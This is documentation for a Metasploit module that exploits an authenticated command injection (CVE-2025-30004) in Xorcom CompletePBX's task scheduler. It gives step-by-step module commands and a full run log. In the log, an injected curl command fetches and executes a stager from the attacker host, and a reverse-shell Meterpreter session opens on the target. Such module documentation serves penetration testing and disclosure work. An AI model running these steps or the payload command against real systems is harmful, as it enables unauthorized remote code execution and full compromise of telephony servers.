## Vulnerable Application

This Metasploit module exploits an **Authenticated Command Injection** vulnerability in **Xorcom CompletePBX <= 5.2.35**.
The issue resides in the task scheduler functionality, where user-controlled input is improperly sanitized, allowing
arbitrary command execution with web server privileges.

Only the **superadmin** user (`admin`) has the necessary permissions to trigger this exploit.
Even when creating a new user with maximum privileges, the vulnerability does not work.

The vulnerability is identified as **CVE-2025-30004**.

### Setup

Download the ova file here: [](https://archive.org/details/completepbx-5-2-27-vuln)

## Verification Steps

1. Deploy a vulnerable instance of **Xorcom CompletePBX <= 5.2.35**.
2. Launch **Metasploit Framework**.
3. Use the module:
```
use exploit/linux/http/xorcom_completepbx_scheduler_rce
```
4. Set the **target host**:
```
set RHOSTS [TARGET_IP]
```
5. Set authentication credentials:
```
set USERNAME [VALID_ADMIN_USERNAME]
set PASSWORD [VALID_ADMIN_PASSWORD]
```
6. Configure the payload:
```
set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
set LPORT [LISTENER_PORT]
```
7. Execute the module:
```
run
```
8. If successful, a **Meterpreter session** will be opened on the target.

## Options

### USERNAME

Admin username for authentication.

### PASSWORD

Admin password for authentication.

## Scenarios

### Successful Exploitation Against a Vulnerable CompletePBX Instance

**Setup**:

- **Target**: Xorcom CompletePBX <= 5.2.35
- **Attacker**: Metasploit Framework instance

**Steps**:

```bash
msf6 exploit(linux/http/xorcom_completepbx_scheduler) > run http://192.168.1.32/
[*] Command to run on remote host: curl -so ./HEuUpqtYDav http://192.168.1.36:8080/LoPlnjEpeOexZNVppn6cAA;chmod +x ./HEuUpqtYDav;./HEuUpqtYDav&
[*] Fetch handler listening on 192.168.1.36:8080
[*] HTTP server started
[*] Adding resource /LoPlnjEpeOexZNVppn6cAA
[*] Started reverse TCP handler on 192.168.1.36:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if the target is running CompletePBX...
[+] Detected CompletePBX on 192.168.1.32:80
[+] The target appears to be vulnerable.
[*] Attempting authentication with username: admin
[+] Authentication successful! Session ID: sid=697e43b483efc1ac316461cde1fbb5d470abc3b4
[*] Creating malicious scheduled task with description: Possimus quibusdam assumenda minima.
[+] Malicious task successfully created.
[*] Retrieving latest task ID for description: Possimus quibusdam assumenda minima....
[+] Found task with ID: 18
[*] Executing malicious task ID 18...
[*] Client 192.168.1.32 requested /LoPlnjEpeOexZNVppn6cAA
[*] Sending payload to 192.168.1.32 (curl/7.88.1)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 192.168.1.32
[+] Task executed successfully!
[*] Sending delete request (mode=delete) for task ID 18...
[*] Sending delete request (mode=deleteConfirmed) for task ID 18...
[+] Task 18 deleted successfully!
[*] Meterpreter session 6 opened (192.168.1.36:4444 -> 192.168.1.32:40800) at 2025-07-16 21:11:31 +0200

meterpreter > sysinfo 
Computer     : localhost.localdomain
OS           : Debian 12.5 (Linux 6.1.0-20-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

### Impact

- This vulnerability grants **remote code execution** capabilities.
- Attackers can execute arbitrary commands as the **web server user**, potentially leading to full system compromise.
- Exploitation provides a **Meterpreter session** for post-exploitation activities.

This module is designed to **demonstrate and automate** the exploitation of this issue using the Metasploit framework.
